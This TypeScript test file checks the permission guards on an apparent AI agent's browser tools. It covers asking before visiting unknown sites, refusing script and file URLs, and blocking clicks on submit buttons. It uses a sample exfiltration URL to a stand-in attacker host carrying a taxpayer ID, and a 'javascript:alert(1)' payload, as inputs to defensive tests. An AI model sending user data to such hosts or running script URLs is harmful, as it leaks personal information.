import { describe, expect, it } from 'bun:test';
import { conversaDe, registrarMensagem } from '../src/conversas';
import { type DepsNavegador, registrarToolsNavegador } from '../src/tools-navegador';

// O que a ponte diria que mudou depois da ação; vazio = sem leitura da página (caminho antigo).
const opcaoMudou = '';

type Handler = (args: Record<string, unknown>) => Promise<{ content: { type: string; text?: string; data?: string; mimeType?: string }[] }>;

/** Monta as tools com uma ponte falsa e devolve o que cada uma fez. */
function montar(opcoes: { links?: string[]; resposta?: string; pedido?: string; abas?: { id: number; url: string }[] }) {
  const handlers = new Map<string, Handler>();
  const servidor = { registerTool: (nome: string, _cfg: unknown, h: Handler) => handlers.set(nome, h) };
  const conversa = conversaDe(new Map(), 'c1');
  registrarMensagem(conversa, opcoes.pedido ?? 'preenche o formulário');
  const enviados: string[] = [];
  const perguntas: string[] = [];
  const deps: DepsNavegador = {
    enviar: (async (cmd: string, args: Record<string, unknown>) => {
      enviados.push(`${cmd}${args.url ? ` ${args.url}` : ''}${args.id ? ` ${args.id}` : ''}`);
      if (cmd === 'links') return { links: opcoes.links ?? [] };
      if (cmd === 'listar_abas') return { abas: (opcoes.abas ?? []).map((a) => ({ ...a, titulo: 'Caixa de entrada (3)', alvo: false })) };
      if (cmd === 'abrir_aba') return { id: 99, url: String(args.url), titulo: '' };
      return { url: String(args.url ?? ''), titulo: '' };
    }) as DepsNavegador['enviar'],
    status: () => {},
    perguntar: async (p) => {
      perguntas.push(p);
      return opcoes.resposta ?? 'Não permitir';
    },
    conversa: () => conversa,
    paginaMudou: () => {},
    ver: async (acao) => ({ resultado: await acao(), mudou: '' }),
    anotar: () => {},
  };
  registrarToolsNavegador(servidor as never, deps);
  const chamar = async (nome: string, args: Record<string, unknown> = {}) => {
    const r = await handlers.get(nome)!(args);
    return r.content[0]?.text ?? '';
  };
  return { chamar, enviados, perguntas, conversa };
}

describe('navegar: a regra é de código', () => {
  it('site estranho pergunta; negado, a aba não sai do lugar', async () => {
    const t = montar({});
    const r = await t.chamar('navegar', { url: 'https://atacante.com/?cpf=123' });
    expect(t.perguntas[0]).toContain('atacante.com');
    expect(r).toContain('não permitiu');
    expect(t.enviados.some((e) => e.startsWith('navegar'))).toBe(false);
  });

  it('aprovado uma vez, o site fica liberado no resto da conversa', async () => {
    const t = montar({ resposta: 'Permitir' });
    await t.chamar('navegar', { url: 'https://nfe.fazenda.sp.gov.br/a' });
    await t.chamar('navegar', { url: 'https://nfe.fazenda.sp.gov.br/b' });
    expect(t.perguntas).toHaveLength(1);
    expect(t.enviados.filter((e) => e.startsWith('navegar'))).toHaveLength(2);
  });

  it('link da página e site citado pela pessoa vão direto, sem perguntar', async () => {
    const t = montar({ links: ['https://loja.com/produto/1'], pedido: 'compara com o preço no mercadolivre.com.br' });
    await t.chamar('navegar', { url: 'https://loja.com/produto/1' });
    await t.chamar('abrir_aba', { url: 'https://www.mercadolivre.com.br/busca' });
    expect(t.perguntas).toHaveLength(0);
  });

  it('javascript: e file: são recusados sem nem perguntar', async () => {
    const t = montar({ resposta: 'Permitir' });
    expect(await t.chamar('navegar', { url: 'javascript:alert(1)' })).toContain('não é permitido');
    expect(t.perguntas).toHaveLength(0);
  });
});

describe('abas: a fronteira é o grupo, não uma pergunta', () => {
  it('usar e fechar aba não perguntam nada: quem recusa aba fora do grupo é a extensão', async () => {
    const t = montar({});
    await t.chamar('usar_aba', { id: 3 });
    await t.chamar('fechar_aba', { id: 4 });
    expect(t.perguntas).toHaveLength(0);
    expect(t.enviados).toEqual(['usar_aba 3', 'fechar_aba 4']);
  });
});

describe('as demais tools só repassam à extensão, com a forma certa', () => {
  it('voltar, esperar, teclar e rolar chegam à extensão; ver_tela devolve imagem', async () => {
    const handlers = new Map<string, Handler>();
    const enviados: { cmd: string; args: unknown }[] = [];
    const status: string[] = [];
    let mudou = 0;
    const deps: DepsNavegador = {
      enviar: (async (cmd: string, args: unknown) => {
        enviados.push({ cmd, args });
        return cmd === 'ver_tela' ? { mime: 'image/jpeg', base64: 'AAAA', largura: 1280, altura: 720 } : { ok: true };
      }) as DepsNavegador['enviar'],
      status: (t) => status.push(t),
      perguntar: async () => '',
      conversa: () => conversaDe(new Map(), 'c'),
      paginaMudou: () => {
        mudou++;
      },
      ver: async (acao) => ({ resultado: await acao(), mudou: opcaoMudou }),
      anotar: () => {},
    };
    registrarToolsNavegador({ registerTool: (n: string, _c: unknown, h: Handler) => handlers.set(n, h) } as never, deps);

    await handlers.get('voltar')!({});
    expect(mudou).toBe(1); // voltar troca a página: as refs antigas não valem

    const foto = await handlers.get('ver_tela')!({});
    expect(foto.content[0]).toEqual({ type: 'image', data: 'AAAA', mimeType: 'image/jpeg' });
    expect(foto.content[1]?.text).toContain('1280×720'); // a IA precisa saber em que espaço de pixels apontar

    await handlers.get('esperar')!({ texto: 'Pedido gerado', segundos: 5 });
    await handlers.get('esperar')!({});
    await handlers.get('teclar')!({ tecla: 'ArrowDown' });
    await handlers.get('rolar')!({ direcao: 'fim' });
    expect(enviados.map((e) => e.cmd)).toEqual(['voltar', 'ver_tela', 'esperar', 'esperar', 'teclar', 'rolar']);
    expect(enviados[2]!.args).toEqual({ texto: 'Pedido gerado', segundos: 5 });
    expect(enviados[3]!.args).toEqual({});
    expect(status.some((t) => t.includes('Pedido gerado'))).toBe(true);
  });
});

describe('clicar_ponto: a ponte olha o que há embaixo antes de clicar', () => {
  function montarPonto(embaixo: { cadeia: { tag: string; papel?: string }[]; texto: string }) {
    const handlers = new Map<string, Handler>();
    const enviados: string[] = [];
    let mudou = 0;
    const deps: DepsNavegador = {
      enviar: (async (cmd: string) => {
        enviados.push(cmd);
        return cmd === 'descrever_ponto' ? embaixo : { ok: true };
      }) as DepsNavegador['enviar'],
      status: () => {},
      perguntar: async () => '',
      conversa: () => conversaDe(new Map(), 'c'),
      paginaMudou: () => {
        mudou++;
      },
      ver: async (acao) => ({ resultado: await acao(), mudou: opcaoMudou }),
      anotar: () => {},
    };
    registrarToolsNavegador({ registerTool: (n: string, _c: unknown, h: Handler) => handlers.set(n, h) } as never, deps);
    const clicar = async () => (await handlers.get('clicar_ponto')!({ x: 400, y: 300 })).content[0]?.text ?? '';
    return { clicar, enviados, mudou: () => mudou };
  }

  it('área desenhada: clica e invalida as refs (a tela pode ter mudado)', async () => {
    const t = montarPonto({ cadeia: [{ tag: 'canvas' }, { tag: 'div' }], texto: '' });
    expect(await t.clicar()).toContain('"ok": true');
    expect(t.enviados).toEqual(['descrever_ponto', 'clicar_ponto']);
    expect(t.mudou()).toBe(1);
  });

  it('botão embaixo do ponto: o clique NÃO chega à extensão', async () => {
    const t = montarPonto({ cadeia: [{ tag: 'span' }, { tag: 'button' }], texto: 'Enviar' });
    expect(await t.clicar()).toContain('ler_campos');
    expect(t.enviados).toEqual(['descrever_ponto']);
  });

  it('<div> com cara de botão de envio: barrado pela guarda de envio', async () => {
    const t = montarPonto({ cadeia: [{ tag: 'div' }], texto: 'Finalizar compra' });
    expect(await t.clicar()).toContain('pedirConfirmacao');
    expect(t.enviados).toEqual(['descrever_ponto']);
  });
});

describe('ações que já dizem o que mudou', () => {
  it('teclar e clicar_ponto respondem com a mudança da página, e as refs novas ficam valendo', async () => {
    const handlers = new Map<string, Handler>();
    let zerou = 0;
    const deps: DepsNavegador = {
      enviar: (async (cmd: string) =>
        cmd === 'descrever_ponto' ? { cadeia: [{ tag: 'canvas' }], texto: '' } : { ok: true }) as DepsNavegador['enviar'],
      status: () => {},
      perguntar: async () => '',
      conversa: () => conversaDe(new Map(), 'c'),
      paginaMudou: () => {
        zerou++;
      },
      ver: async (acao) => ({ resultado: await acao(), mudou: 'Apareceu:\nÁrea selecionada: azul' }),
      anotar: () => {},
    };
    registrarToolsNavegador({ registerTool: (n: string, _c: unknown, h: Handler) => handlers.set(n, h) } as never, deps);
    expect((await handlers.get('teclar')!({ tecla: 'Delete' })).content[0]?.text).toBe(
      'Tecla Delete apertada.\n\nApareceu:\nÁrea selecionada: azul',
    );
    expect((await handlers.get('clicar_ponto')!({ x: 1, y: 1 })).content[0]?.text).toContain('Área selecionada: azul');
    expect(zerou).toBe(0); // a leitura nova já trouxe as refs: não precisa mandar ler de novo
  });
});
